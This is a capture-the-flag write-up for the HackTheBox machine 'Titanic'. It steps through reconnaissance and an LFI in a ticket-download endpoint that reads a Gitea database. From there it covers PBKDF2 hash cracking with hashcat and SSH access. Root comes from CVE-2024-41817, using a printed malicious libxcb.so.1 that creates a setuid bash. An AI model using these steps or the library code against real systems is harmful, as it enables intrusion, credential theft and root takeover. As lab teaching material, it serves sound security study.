---
tags:
  - Linux
  - HTTP
  - LFI
  - Cron-job
  - DLL Hijacking
---

... is a easy HTB machine which allows downloading a `sqlite3` database-file via a `LFI` vulnerability. Using the gained credentials for `ssh`, a vulnerable version of `magick` is present, which `root` is executing continuously. A shared library is loaded into that binary, executing arbitrary code as `root`.


### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This is a very typical setup of a web-vulnerability type CTF, where the `http` allows you to execute remote code on the machine, to allow you to find credentials for `ssh`. The output of the `http-title` `nmap` script tells us that the domain name `titanic.htb` is present. To quickly edit the `/etc/hosts` file for local DNS name resolution without a public DNS server, the following command appends an entry to that file:
```bash
echo "$IP titanic.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

After visiting `http://titanic.htb`, i see a home-page a ship-trip booking service called `Titanic`. The `view-source` of the landing page and the `Devtools` of the browser do not reveal anything interesting. Although, there exist a button to `Book Your Trip`, where a form pops up which accepts user data. 

Filling it out with test data and pressing `Submit` sends a `POST` request to `/book` with the parameters `name`, `email`, `phone`, `date` and `cabin` (-type). The response to this `POST` request is a redirect to `/download?ticket=<randomized-name>.json`. A `GET` request is automatically made to that endpoint, which returns the data i have entered in `JSON` format. This functionality will be kept in mind, but before trying to exploit it, i look for more endpoints and sub-domains.

To find more endpoints that may be hidden, i use `ffuf` to employ forceful browsing using this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://titanic.htb/FUZZ" -fs 162 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 162 are "404" errors.
# -mc: accept any response code
```

This has revealed nothing new, not even with the word-list `big.txt`.

I decided to also do some `VHost` fuzzing using the `subdomains-top1million-110000.txt` from `SecLists/Discovery/DNS`:
```bash
ffuf -w ./subdomains-top1million-110000.txt -H "Host: FUZZ.titanic.htb" -u http://titanic.htb -fc 301 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.titanic.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fc: filter by response response code, as the size seems to vary a tiny bit with each request
# -mc: accept any response code
```

This did find the additional VHost `dev.titanic.htb`! I also add this domain to the `/etc/passwd` file using this command:
```bash
sudo sed -i "s/$IP titanic.htb/$IP titanic.htb dev.titanic.htb/" /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: required, as we are editing /etc/hosts
# -i: edit the file in-place and overwrite it
# "s/old_word/new_word/": replaces each occurance of old_word with new_word
# /etc/hosts: file we want to edit
```

This new sub-domain shows an instance of `Gitea`! In the `Explore` tab i find two projects which i can view the source code of:

- `developer/docker-config`: Reveals the `docker-compose.yml` for the `gitea` app and for the `mysql` database. The `gitea` config file reveals the location of `gitea` to be `/home/developer/gitea/data`. The database config file reveals it's credentials `sql_svc:MySQLP@$$w0rd!`!

- `developer/flask-app`: Reveals the source code to the `titanic` application. Two pre-defined tickets leak the two users `rose.bukater@titanic.htb` and `jack.dawson@titanic.htb`.

### Initial Exploitation
The `app.py` source code to the booking service app confirms my suspicion of a `LFI`, as the user-provided parameter `/download?ticket=<file>` is not being sanitized, so i can input any file i want. To confirm this, i fetch the `/etc/passwd` file and it returns me it's content. The [official Gitea docs](https://docs.gitea.com/administration/config-cheat-sheet#:~:text=Any%20changes%20to%20the%20Gitea,%2Fgitea%2Fconf%2Fapp.) reveal that the applications config file is located at `custom/gitea/conf/app.ini`. As i know that the `gitea` location is at `/home/developer/gitea/data` (from the `docker-compose.yml`), i can replace the `custom` keyword from the `app.ini` location with this path. The `GET` request for this resource looks like this:
```http
GET /download?ticket=/home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
```

This configuration file reveals the location of the `mysql` database file, which is `/data/gitea/gitea.db`. The full path to this would then be:
`/home/developer/gitea/data/gitea/gitea.db`.

I fetch this file onto my local machine by intercepting the `GET` request to the download API, and by replacing the file with the `database` file location. I can enumerate the tables of this database with this command:
```bash
sqlite3 ./gitea.db ".tables"
```
With this command:
```bash
sqlite3 ./gitea.db "select * from user;"
```
... i receive the hashes of the users `developer` and `administrator`. These are in the `PBKDF2-HMAC-SHA256` format. It follows the structure of
```bash
pbkdf2-sha256:$iterations:$salt:$hash
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# pbkdf2-sha256: identifies the hashing algorithm.
# $iterations: is the number of PBKDF2 iterations.
# $salt: is the base64-encoded salt used for the password.
# $hash: is the resulting base64-encoded PBKDF2 hash.
```

All credits go to [unix-ninja](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes)! He also made a tool `gitea2hashcat.py` which automatically transforms these hash formats into a `hashcat`-crackable format! It works like this:
```bash
sqlite3 ./gitea.db "select salt,passwd from user;" | python3 gitea2hashcat.py
```
This gives me the hash of `developer` in the correct format so that i can crack it using this `hashcat` command:
```bash
hashcat -m 10900 ./hash.txt ./rockyou.txt
```

This results in the clear-text password `25282528` of the system user `developer`! I can use this for his `ssh`, removing the need to do any lateral movement.

### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

None of these seemed to point at obvious privilege escalation vectors, so i decided to dig deeper and look for `SetUID` binaries and the capabilities of binaries:
```bash
find / -user root -perm /4000 -exec ls -ldb {} \; 2>/dev/null
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# find /: get all files starting from `/`
# -user: specify which user should own them
# -perm: specify permissions, here setuid!
# -exec ls -ldb: prints the output a bit prettier
# 2>/dev/null: discards error messages
```

and
```bash
getcap -r / 2>/dev/null
```
But nothing out of the ordinary showed up.

I investigated the `/opt` directory, as it is usually used for third-party software that is not part of the OS. In there i find the file `/opt/scripts/identify_images.sh`. This bash script uses the binary `magick`, which i have not heard of before. Researching it, tells me that it is used to analyze and describe the characteristics of image files. Googling `magick exploit` reveals many famous `CVE`s that can lead to `RCE` or file reads!

I find out the version of the binary using `magick --version`, to identify if any `CVE` is actually usable. Googling `magick 7.1.1-35 exploit` reveals `CVE-2024-41817`! The flaw in this version of `magick` is that it uses empty path entries in the `LD_LIBRARY_PATH` variable (usually used to find shared libraries required for `magick`). An empty path in `linux` is interpreted as the current working directory. This means that if it executes without the `LD_LIBRARY_PATH` variable set, it may use `.so` files which can be found in the current directory and execute the code that they provide!

Sadly, this does not achieve anything of interest, as the `magick` binary does not have the `SetUID` bit set, nor can `developer` execute it as `root`. It becomes useful however, if `root` executes that binary, as i can place a `.so` library in the path of execution, which gets loaded and ran as `root`. To find out if anyone is using this binary, i decided to spy on them using the binary `pspy`! I download it onto my local machine from the official [GitHub](https://github.com/dominicbreuker/pspy) releases page, and serve it via `http` by starting a `python3 -m http.server`. I `curl` it onto `developer`'s home directory, make it executable with `chmod +x`, and start it with the following flags:
```bash
./pspy64 -f -r /opt
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -f: also print filesystem events
# -r: recursively monitor /opt
```

This tells me that the `/opt/script/identify_images` is being constantly used on the `/opt/app/static/assets/images` directory to check the image files.

I quickly create a `evil.c` with the following content:
```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init(){
    system("cp /bin/bash /home/developer/rootme; chmod u+s /home/developer/rootme");
    exit(0);
}
```
This should create a copy of `bash` at `developers` home directory, with the `setuid` bit set! To compile this `C` file into a shared library, i issue the following command (luckily, `gcc` is on the target):
```bash
gcc evil.c -shared -fPIC -o ./libxcb.so.1
```
Then, i can move this library to `/opt/app/static/assets/images/`, as i have write permissions there!

After waiting for a few seconds, i receive the `rootme` binary which i can use with `./rootme -p` to elevate `developer` to `root`!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|LFI| B[SQLite3<br>database];
  B -->|Hash<br>cracking| C[SSH<br>Access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|Path<br>hijack| B[magick];
  C[root] -->|Cron<br>job| B[magick];
  B -->|DLL<br>hijack| D[Command<br>execution<br>as root];
```